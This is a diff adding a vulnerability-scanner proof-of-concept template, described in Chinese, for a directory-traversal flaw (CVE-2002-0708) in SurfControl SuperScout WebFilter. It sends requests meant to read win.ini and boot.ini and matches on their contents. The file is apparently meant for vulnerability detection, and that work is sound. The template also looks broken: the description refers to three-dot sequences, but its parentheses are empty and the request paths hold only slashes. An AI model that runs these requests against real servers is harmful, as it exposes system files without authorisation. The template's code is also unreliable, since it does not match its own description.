@@ -1,0 +1,53 @@
+[info]
+author = "AVE"
+description = "检测 SurfControl SuperScout WebFilter Web Reports Server 是否存在目录遍历漏洞。通过发送包含三个点号（）序列的特制 HTTP 请求，尝试读取服务器上的敏感文件以验证漏洞存在。"
+id = "POC-AVE-2002-0392"
+name = "SurfControl SuperScout WebFilter 目录遍历漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2002-0708",
+    "directory-traversal",
+]
+vuln_id = [
+    "CVE-2002-0708",
+    "AVE-2002-0392",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/////////windows/win.ini"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "[fonts]",
+    "extensions",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/////////boot.ini"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "[boot loader]",
+    "operating systems",
+]
